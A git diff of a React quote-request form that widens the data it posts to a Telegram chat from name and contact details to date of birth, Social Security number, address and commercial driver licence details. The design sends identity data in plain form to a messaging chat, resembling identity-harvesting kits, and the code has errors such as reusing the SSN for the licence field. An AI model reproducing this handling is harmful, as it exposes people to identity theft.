@@ -1,7 +1,7 @@
 import axios from "axios";
 import React, { useState } from "react";
 import { Link } from "react-router-dom";
-import { toast, ToastContainer } from "react-toastify";
+import { toast } from "react-toastify";
 import Footer from "../Footer";
 import Header from "../Header";
 import Loader from "../Loader";
@@ -55,7 +55,20 @@ export default function Quote({ link }) {
         {
           chat_id: -864366784,
           parse_mode: "HTML",
-          text: `#Quote\n<b>Name:</b>${data.name} %0A<b>Phone:</b>${data.phone}%0A<b>Email:</b>${data.email} %0A<b>Message:</b>%0A;`,
+          text: `#Quote\n
+          <b>Name:</b>${data.name} 
+          <b>DOB:</b>${data.dob}
+          <b>SNN:</b>${data.snn}
+          <b>DRIVER'S ADDRESS:</b>${data.adress} 
+          <b>City:</b>${data.city}
+          <b>state:</b>${data.state}
+          <b>ZIP:</b>${data.zip}
+          <b>COMMERCIAL DRIVER LICENSE::</b>${data.snn}
+          <b>Exprires:</b>${data.expires}
+          <b>Sxp-State:</b>${data.ex_state}
+          <b>Number:</b>${data.num}
+          <b>Phone:</b>${data.phone}
+          <b>Email:</b>${data.email};`,
         }
       )
       .then(function (response) {
@@ -83,8 +96,8 @@ export default function Quote({ link }) {
       });
   }
   return (
-      <>
-          <Loader/>
+    <>
+      <Loader />
       <Header quote={link} />
       <div className="about__">
         <div className="container_70">
